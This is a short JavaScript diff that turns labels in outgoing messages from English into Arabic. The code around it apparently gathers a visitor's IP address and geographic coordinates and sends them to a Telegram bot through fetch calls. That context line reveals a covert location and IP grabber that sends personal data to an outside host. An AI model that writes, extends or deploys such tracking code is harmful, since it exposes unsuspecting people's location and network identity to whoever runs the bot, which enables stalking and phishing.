@@ -27,7 +27,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `Location Result: La -> ${latitude}, Lo -> ${longitude}\nIP -> ${ipAddress}`;
+    const message = `الموقع: \nLa ==> ${latitude}\nLo ==> ${longitude}\nالايبي ==> ${ipAddress}`;
 
     // Send location and IP results to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
@@ -52,7 +52,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `IP Result: ${ipAddress}`;
+    const message = `الايبي ==> ${ipAddress}`;
 
     // Send IP result to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
